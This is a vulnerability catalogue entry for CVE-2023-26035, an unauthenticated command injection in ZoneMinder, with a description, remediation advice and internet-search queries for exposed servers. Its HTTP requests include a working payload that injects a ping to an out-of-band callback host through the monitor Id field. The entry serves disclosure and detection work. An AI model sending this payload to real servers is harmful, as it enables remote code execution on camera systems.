---
layout: post
cve_id: CVE-2023-26035
title: ZoneMinder Snapshots - Command Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-26035.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-26035.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Unblvr1,whotwagner
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary commands on the ZoneMinder
  server by exploiting missing authorization checks, potentially compromising all
  monitored camera systems and recorded footage.

  '
remediation: 'Upgrade to ZoneMinder version 1.36.33 or 1.37.33 or later.

  '
reference:
- https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/
- https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr
- https://packetstormsecurity.com/files/175675/ZoneMinder-Snapshots-Command-Injection.html
- https://github.com/rvizx/CVE-2023-26035
- https://nvd.nist.gov/vuln/detail/CVE-2023-26035
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-26035
  cwe-id: CWE-862
  epss-score: 0.49634
  epss-percentile: 0.97701
  cpe: cpe:2.3:a:zoneminder:zoneminder:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: zoneminder
  product: zoneminder
  shodan-query:
  - html:"ZM - Login"
  - http.html:"zm - login"
  fofa-query: body="zm - login"
tags:
- cve
- cve2023
- rce
- zoneminder
- unauth
- packetstorm
- vuln
---

## üîç Vulnerability Description
ZoneMinder is a free, open source Closed-circuit television software application for Linux which supports IP, USB and Analog cameras.Versions prior to 1.36.33 and 1.37.33 are vulnerable to Unauthenticated Remote Code Execution via Missing Authorization. There are no permissions check on the snapshot action, which expects an id to fetch an existing monitor but can be passed an object to create a new one instead. TriggerOn ends up calling shell_exec using the supplied Id.


## üåê HTTP Request
```nohighlight
GET /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15
Connection: close
Content-Length: 115
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

view=snapshot&action=create&monitor_ids[0][Id]=;ping+d5ir5d9le0o2eb1k1o60a98dtf6dwy6zt.oast.pro&__csrf_magic=U4OGr3
```

